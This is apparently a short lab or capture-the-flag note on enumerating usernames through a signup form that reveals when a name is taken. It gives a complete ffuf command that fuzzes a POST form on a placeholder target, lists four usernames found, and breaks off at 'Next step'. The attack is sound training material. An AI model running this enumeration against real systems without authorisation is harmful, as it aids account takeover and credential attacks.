Username Enumeration (ffuf)
===========================
Goal : Discover valid usernames through the signup form.
Idea : The form leaks info - if the username is already taken it returns
       "username already exists". ffuf matches that response (-mr).

Command
-------
ffuf \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://<TARGET_IP>/customers/signup \
  -mr "username already exists" \
  -o cred.txt -of csv

Result - valid usernames
------------------------
admin
robert
simon
steve

Next step
